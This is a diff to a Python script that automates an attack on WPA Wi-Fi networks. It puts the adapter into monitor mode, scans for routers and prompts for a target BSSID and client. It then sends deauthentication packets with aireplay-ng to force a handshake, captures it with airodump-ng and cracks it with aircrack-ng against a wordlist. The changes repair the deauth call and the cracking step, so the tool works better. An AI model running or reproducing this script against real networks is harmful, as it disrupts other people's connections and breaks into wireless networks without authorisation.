@@ -1,5 +1,7 @@
 import os
 import subprocess
+from subprocess import Popen, PIPE
+
 
 print('Switching wifi to monitor mode')
 os.system('sleep4')
@@ -8,7 +10,7 @@ subprocess.call(["airmon-ng", "stop", "wlp2s0"])
 subprocess.call(["airmon-ng", "start", "wlp2s0"])
 os.system("xterm -e 'airodump-ng -w /tmp/scan --output-format csv wlp2s0mon; read'")
 ##os.system("xterm -e 'airodump-ng wlp2s0mon; read'")
-
+os.system('clear')
 channel = raw_input('Please enter channal router is using: \n')
 os.system('sleep2')
 os.system('clear')
@@ -21,7 +23,7 @@ os.system('clear')
 station = raw_input('Please client bssid{station id}: \n')
 os.system('sleep2')
 os.system('clear')
-number = raw_input('Please enter number of time death packet will be send{from 1 to 10}: \n')
+number = raw_input('Please enter the number between 0 -- 10, amount deauth be send to client: \n')
 os.system('sleep2')
 os.system('clear')
 
@@ -29,11 +31,18 @@ print('Starting handsake process')
 os.system('sleep4')
 os.system('clear')
 
-subprocess.call(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", path, "wlp2s0mon"])
-os.system("xterm -e 'aireplay-ng -0 ("number") -a bssid -c station wlp2s0; read'")
+Popen(['xterm', '-e', 'aireplay-ng', '-0', number, '-a', bssid, '-c', station, 'wlp2s0mon'])
+Popen(['xterm', '-e', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', path, 'wlp2s0mon'])
+#subprocess.call(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", path, "wlp2s0mon"])
+os.system('sleep4')
+os.system('clear')
 
-path1 = raw_input('Please enter path were worldlist is kept for cracking router: ')
+path1 = raw_input('Please enter path were worldlist is kept for cracking router: \n')
 os.system('sleep2')
 os.system('clear')
-subprocess.call(["aircrack-ng", "-a", "2", "-b", bssid, "-w", path])
+path2 = raw_input('Please enter path were handsake is kept for router{and remember add file format}: \n')
+os.system('sleep2')
+os.system('clear')
+subprocess.call(["airmon-ng", "stop", "wlp2s0mon"])
+subprocess.call(["aircrack-ng", "-a", "2", "-b", bssid, "-w", path1, path2])
 exit(0)
